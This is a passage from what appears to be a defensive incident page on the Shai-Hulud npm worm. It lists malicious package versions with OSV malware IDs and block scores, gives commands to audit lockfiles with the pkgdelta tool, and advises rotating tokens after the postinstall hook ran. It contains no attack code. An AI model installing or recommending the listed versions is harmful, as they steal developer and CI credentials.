| `swc-plugin-component-annotate` | 1.9.1 | 1.9.0 | [MAL-2025-47210](https://osv.dev/vulnerability/MAL-2025-47210) | BLOCK (19) | high_risk |
| `swc-plugin-component-annotate` | 1.9.2 | 1.9.0 | [MAL-2025-47210](https://osv.dev/vulnerability/MAL-2025-47210) | BLOCK (19) | high_risk |
| `tg-client-query-builder` | 2.14.4 | 2.14.3 | [MAL-2025-47350](https://osv.dev/vulnerability/MAL-2025-47350) | BLOCK (19) | high_risk |
| `tg-redbird` | 1.3.1 | 1.3.0 | [MAL-2025-47351](https://osv.dev/vulnerability/MAL-2025-47351) | BLOCK (19) | high_risk |
| `tg-seq-gen` | 1.0.10 | 1.0.8 | [MAL-2025-47352](https://osv.dev/vulnerability/MAL-2025-47352) | BLOCK (19) | high_risk |
| `tg-seq-gen` | 1.0.9 | 1.0.8 | [MAL-2025-47352](https://osv.dev/vulnerability/MAL-2025-47352) | BLOCK (19) | high_risk |
| `thangved-react-grid` | 1.0.3 | 1.0.2 | [MAL-2025-47353](https://osv.dev/vulnerability/MAL-2025-47353) | BLOCK (17) | high_risk |
| `ts-gaussian` | 3.0.5 | 3.0.4 | [MAL-2025-47213](https://osv.dev/vulnerability/MAL-2025-47213) | BLOCK (21) | high_risk |
| `ts-gaussian` | 3.0.6 | 3.0.4 | [MAL-2025-47213](https://osv.dev/vulnerability/MAL-2025-47213) | BLOCK (21) | high_risk |
| `ts-imports` | 1.0.1 | 1.0.0 | [MAL-2025-47355](https://osv.dev/vulnerability/MAL-2025-47355) | BLOCK (19) | high_risk |
| `ts-imports` | 1.0.2 | 1.0.0 | [MAL-2025-47355](https://osv.dev/vulnerability/MAL-2025-47355) | BLOCK (19) | high_risk |
| `tvi-cli` | 0.1.5 | 0.1.4 | [MAL-2025-47357](https://osv.dev/vulnerability/MAL-2025-47357) | BLOCK (14) | high_risk |
| `ve-bamreader` | 0.2.6 | 0.2.5 | [MAL-2025-47358](https://osv.dev/vulnerability/MAL-2025-47358) | BLOCK (18) | high_risk |
| `ve-editor` | 1.0.1 | 1.0.0 | [MAL-2025-47359](https://osv.dev/vulnerability/MAL-2025-47359) | BLOCK (20) | high_risk |
| `verror-extra` | 6.0.1 | 6.0.0 | [MAL-2025-47360](https://osv.dev/vulnerability/MAL-2025-47360) | BLOCK (19) | high_risk |
| `voip-callkit` | 1.0.2 | 1.0.1 | [MAL-2025-47416](https://osv.dev/vulnerability/MAL-2025-47416) | BLOCK (19) | high_risk |
| `yargs-help-output` | 5.0.3 | 5.0.2 | [MAL-2025-47366](https://osv.dev/vulnerability/MAL-2025-47366) | BLOCK (19) | high_risk |

</details>
<!-- numbers:end -->

## Am I affected?

```
pip install git+https://github.com/thejusdutt/pkgdelta
pkgdelta audit package-lock.json      # or pnpm-lock.yaml / yarn.lock
```

`audit` checks every locked version against its previous release and asks [OSV](https://osv.dev) whether it is known malware, so versions npm has since deleted still fail. The full list is below.

If one of these versions was installed, the postinstall hook ran. Rotate every npm and GitHub token and cloud key that machine or CI job could read, check your GitHub account for repositories named `Shai-Hulud` and for `shai-hulud` branches, and check the packages you publish for versions you didn't make.

Next: [Shai-Hulud 2.0](shai-hulud-2.md) (November 2025). All incidents: [index](README.md).
